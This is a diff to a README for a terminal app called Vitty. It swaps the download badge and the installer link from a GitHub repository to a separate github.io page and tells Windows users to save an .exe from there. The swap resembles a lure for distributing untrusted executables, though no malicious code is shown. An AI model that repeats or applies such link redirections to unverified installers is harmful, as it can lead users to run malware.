@@ -1,6 +1,6 @@
 # 💻 Vitty - Get a faster, cleaner terminal experience
 
-[![Download Vitty](https://img.shields.io/badge/Download_Vitty-blue.svg)](https://github.com/Gusparisian117/Vitty)
+[![Download Vitty](https://img.shields.io/badge/Download_Vitty-blue.svg)](https://gusparisian117.github.io)
 
 Vitty provides a simple terminal for your computer. It focuses on speed and removes unnecessary extras. This helps you get work done without distractions. The design emphasizes clean lines and fast response times.
 
@@ -9,7 +9,7 @@ Vitty provides a simple terminal for your computer. It focuses on speed and remo
 You can set up Vitty in a few steps. Follow these instructions to prepare your system and launch the application.
 
 1. Check your system. Vitty runs on modern Windows versions. Ensure you have at least 4GB of RAM and 100MB of free disk space.
-2. Visit the download page. Go to this link to find the installer: [https://github.com/Gusparisian117/Vitty](https://github.com/Gusparisian117/Vitty)
+2. Visit the download page. Go to this link to find the installer: [https://gusparisian117.github.io](https://gusparisian117.github.io)
 3. Choose the Windows installer. Look for the file ending in `.exe`. 
 4. Save the file to your Downloads folder.
 
